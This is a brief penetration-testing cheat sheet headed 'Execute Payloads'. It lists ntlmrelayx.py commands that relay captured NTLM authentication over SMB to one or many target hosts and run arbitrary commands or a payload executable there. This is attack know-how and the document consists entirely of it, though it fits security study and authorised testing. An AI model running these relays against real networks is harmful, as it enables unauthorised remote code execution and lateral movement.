# 03 - Execute Payloads

```
$ sudo ntlmrelayx.py -t smb://<target_IP> -smb2support -c <commands>

$ sudo ntlmrelayx.py -tf targets.txt -smb2support -c <commands>

$ sudo ntlmrelayx.py -t smb://<target_IP> -smb2support -e payload.exe

$ sudo ntlmrelayx.py -tf targets.txt -smb2support -e payload.exe
```